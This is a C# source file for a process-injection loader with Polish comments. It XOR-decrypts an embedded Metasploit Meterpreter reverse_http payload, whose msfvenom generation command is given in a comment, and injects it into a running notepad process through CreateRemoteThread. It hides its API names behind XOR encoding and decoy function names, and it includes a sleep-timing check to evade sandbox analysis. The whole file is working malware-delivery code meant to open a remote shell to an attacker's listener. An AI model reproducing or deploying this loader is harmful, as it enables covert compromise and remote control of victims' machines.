using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SharpInjectProcess
{

    public class Program
    {
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        // VirtualAlloc
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr aaaaaaaaaaaa(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // CreateThread
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr bbbbbbbbbbbbb(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // WaitForSingleObject
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate UInt32 ccccccccccccccc(IntPtr hHandle, UInt32 dwMilliseconds);

        // OpenProcess
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        // VirtualAllocEx
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // WriteProcessMemory
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate bool Type_WriteProcessMemory(IntPtr hprocess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // CreateRemoteThread
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddresss, IntPtr lpParameter, uint DwCreationFlags, out IntPtr lpThreadId );

        // MessageBox
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_MessageBox(IntPtr hWnd, String text, String caption, uint type);


        // Ponizej funkcja o nazwie addworkstation ktora przyjmuje zaxorowany strumien bajtow, odxorowuje go i zwraca string
        public static string addworkstation(byte[] data)
        {
            byte[] adduser = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                adduser[i] = (byte)(data[i] ^ 0xa0);
            }
            return Encoding.Default.GetString(adduser);
        }

        // ponizej funkcja o nazwie helloworld ktora przyjmuje zaxorowany strumien bajtow, string klucz i zwraca odxorowany strumien bajtow
        public static byte[] helloworld(byte[] e_buf, string key)
        {
            byte[] d_buf = new byte[e_buf.Length];
            byte[] key_bytes = Encoding.UTF8.GetBytes(key);

            for (int i=0; i<e_buf.Length; i++)
            {
                d_buf[i] = (byte)(e_buf[i] ^ key_bytes[i%key_bytes.Length]);
            }


            return d_buf;
        }

        // ponizej funkcja ktora sprawdza czy jestesmy w sandboxie. Czesto sandboxy jak widzą sleepy to robia fast-forward do kolejnego kroku. Robimy wiec sleep 2 sekundy, sprawdzamy czy rzeczywiscie minely 2 sekundy (sprawdzajac timeofday) 

        public static void amireal()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if(t2 < 1.5)
            {
                return;
            }
            else
            {
                Execute();
            }
        }




        public static void Execute()
        {
            const uint DELETE = 0x00010000;
            const uint READ_CONTROL = 0x00020000;
            const uint WRITE_DAC = 0x00040000;
            const uint WRITE_OWNER = 0x00080000;
            const uint SYNCHRONIZE = 0x00100000;
            const uint END = 0xFFF;
            const uint PROCESS_ALL_ACCESS = (DELETE | READ_CONTROL | WRITE_DAC | WRITE_OWNER | SYNCHRONIZE | END);

            // Ponizej Twoj shellcode! msfvenom -p windows/x64/meterpreter/reverse_http --encrypt xor  --encrypt-key siemanko LHOST=192.168.y.x LPORT=8080 -f csharp
            byte[] buf = new byte[642] {0x8f,...,0xc9,0x39,0x8c,0xbc
};

            buf = helloworld(buf, "siemanko");

            int buflen = buf.Length + 1;
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            //}

            // Zaladowanie biblioteki user32.dll i kernel32.dll
            string user32dll = "user32.dll";
            string kernel32dll = "kernel32.dll";
            IntPtr huser32dll = LoadLibrary(user32dll);
            IntPtr hkernel32dll = LoadLibrary(kernel32dll);

            // Znalezienie wskaznika na funkcje MessageBoxA
            //string strMessageBox = "MessageBoxA";
            //IntPtr hMessageBox = GetProcAddress(huser32dll, strMessageBox);
            //Type_MessageBox mb = (Type_MessageBox)Marshal.GetDelegateForFunctionPointer(hMessageBox, typeof(Type_MessageBox));
            //mb(IntPtr.Zero, "Justtest", "Justfortest", 0);


            // znalezienie wskaznika na OpenProcess i zdefiniowanie open process
            byte[] e_op = { 0xef, 0xd0, 0xc5, 0xce, 0xf0, 0xd2, 0xcf, 0xc3, 0xc5, 0xd3, 0xd3 };
            IntPtr hOpenProcess = GetProcAddress(hkernel32dll, addworkstation(e_op));   
            Type_OpenProcess op = (Type_OpenProcess)Marshal.GetDelegateForFunctionPointer(hOpenProcess, typeof(Type_OpenProcess));

            // znalezienie wskaznika na VirtualAllocEx i zdefiniowanie VirtualAllocEx
            byte[] e_vax = { 0xf6, 0xc9, 0xd2, 0xd4, 0xd5, 0xc1, 0xcc, 0xe1, 0xcc, 0xcc, 0xcf, 0xc3, 0xe5, 0xd8 };
            IntPtr hVirtualAllocEx = GetProcAddress(hkernel32dll , addworkstation(e_vax));
            Type_VirtualAllocEx vax = (Type_VirtualAllocEx)Marshal.GetDelegateForFunctionPointer(hVirtualAllocEx, typeof(Type_VirtualAllocEx));


            // Znalezienie wskaznikana WriteProcessMemory i zdefiniowanie WriteProcessMemory
            byte[] e_wpm = { 0xf7, 0xd2, 0xc9, 0xd4, 0xc5, 0xf0, 0xd2, 0xcf, 0xc3, 0xc5, 0xd3, 0xd3, 0xed, 0xc5, 0xcd, 0xcf, 0xd2, 0xd9 };
            IntPtr hWritePricessMemory = GetProcAddress(hkernel32dll, addworkstation(e_wpm));
            Type_WriteProcessMemory wpm = (Type_WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(hWritePricessMemory, typeof(Type_WriteProcessMemory));


            // Znalezienie Wskaznika na CreateRemoteThread i zdefiniowanie CreateRemoteThread
            byte[] e_crm = { 0xe3, 0xd2, 0xc5, 0xc1, 0xd4, 0xc5, 0xf2, 0xc5, 0xcd, 0xcf, 0xd4, 0xc5, 0xf4, 0xc8, 0xd2, 0xc5, 0xc1, 0xc4 };
            IntPtr hCreateRemoteThread = GetProcAddress(hkernel32dll, addworkstation(e_crm));
            Type_CreateRemoteThread crt = (Type_CreateRemoteThread)Marshal.GetDelegateForFunctionPointer(hCreateRemoteThread, typeof(Type_CreateRemoteThread));

            // Tu wpisz do jakiego procesu chcesz wstrzyknac ShellCode
            Process[] processes = Process.GetProcessesByName("notepad");
            int pid = processes[0].Id;

            IntPtr prochandle = op(PROCESS_ALL_ACCESS, false, (uint)pid);
            IntPtr memaddr = vax(prochandle, IntPtr.Zero, (uint)buflen, 0x3000, 0x40);
            //int bytesWritten = 0;
            wpm(prochandle, memaddr, buf, buflen, out var bytesWritten);
            IntPtr hcrt = crt(prochandle, IntPtr.Zero, 0, memaddr, IntPtr.Zero, 0, out var lpThreadId);
            

        }

        public static void Main(string[] args)
        {
            amireal();
        }
    }
}
